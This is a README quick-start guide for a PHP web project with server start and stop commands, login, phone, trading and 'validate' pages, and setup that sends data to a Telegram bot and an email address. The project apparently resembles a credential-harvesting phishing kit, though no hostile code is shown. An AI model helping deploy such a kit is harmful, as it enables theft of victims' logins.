# New-interface-connect - Quick Start Guide

## 🚀 How to Run This Project

### First Time Setup
```bash
cd "/home/nathan/Downloads/Telegram Desktop/New-interface-connect"
chmod +x start.sh stop.sh
```

### Start the Application
```bash
./start.sh
```

### Stop the Application
```bash
./stop.sh
```

---

## 📋 Manual Commands (Alternative)

### Start Server
```bash
php -S localhost:8000
```

### Start Server in Background
```bash
nohup php -S localhost:8000 > server.log 2>&1 &
echo $! > server.pid
```

### Stop Background Server
```bash
kill $(cat server.pid)
rm server.pid
```

---

## 🌐 Access Points

Once running, access the application at:
- **Main**: http://localhost:8000/
- **Login**: http://localhost:8000/login/
- **Phone**: http://localhost:8000/phone/
- **Trading**: http://localhost:8000/trading/
- **Validate**: http://localhost:8000/ennn/validate/
- **Secure App**: http://localhost:8000/secure-app/

---

## 📝 Quick Reference

| Command | Description |
|---------|-------------|
| `./start.sh` | Start the server |
| `./stop.sh` | Stop the server |
| `cat server.log` | View server logs |
| `cat server.pid` | Check server process ID |

---

## ✅ Project Status

All critical bugs have been fixed:
- ✅ No syntax errors
- ✅ No undefined variables
- ✅ All functions working
- ✅ Security improvements implemented
- ✅ Environment variable system
- ✅ CSRF protection ready
- ✅ Rate limiting enabled
- ⚠️ Manual configuration required (see below)

---

## 🔒 Security Setup (REQUIRED)

### 1. Install Dependencies
```bash
composer install
```

### 2. Configure Environment
```bash
cp .env.example .env
nano .env  # Add your credentials
```

### 3. What to Configure
- `TELEGRAM_BOT_TOKEN` - Your Telegram bot token
- `TELEGRAM_CHAT_ID` - Your Telegram chat ID
- `SEND_EMAIL` - Your email address

**See `MANUAL_TASKS.md` for complete setup instructions**

---

## ⚠️ Security Notice

**Before production use**, review:
- `SECURITY_NOTES.md` - Critical security issues
- `FIXES_APPLIED.md` - What was fixed
- `.env.example` - Environment variable template

---

## 🔧 Requirements

- PHP 7.4+ (tested with PHP 8.4.5)
- Port 8000 available
- Linux/macOS/WSL environment

---

## 📞 Troubleshooting

**Port already in use?**
```bash
# Find what's using port 8000
lsof -i :8000

# Use a different port
php -S localhost:8080
```

**Server won't start?**
```bash
# Check PHP is installed
php -v

# Check for syntax errors
php -l login/config.php
```

**View errors?**
```bash
tail -f server.log
```

---

**Last Updated**: February 6, 2026
